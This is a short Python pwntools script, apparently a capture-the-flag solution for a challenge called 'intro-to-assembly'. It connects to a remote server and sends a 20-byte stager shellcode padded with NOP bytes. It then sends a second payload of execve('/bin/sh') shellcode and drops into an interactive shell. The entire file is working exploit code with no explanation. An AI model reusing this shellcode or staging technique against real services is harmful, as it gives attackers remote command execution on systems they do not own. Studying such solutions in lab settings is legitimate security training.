from pwn import *


#p = process("intro-to-assembly")
p=remote('34.185.173.244',31352)

shellcode_first_input = b"\x48\x89\xD6\x50\x5F\x48\xC7\xC2\x00\x01\x00\x00\x68\x10\x11\x40\x00\x58\xFF\xD0" # 20bytes len

#gdb.attach(p)

shellcode_second_input = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len

payload = 'A' * 0x15 + shellcode_second_input

p.send(shellcode_first_input.ljust(0x18, b"\x90"))
p.sendline(payload)

p.interactive()
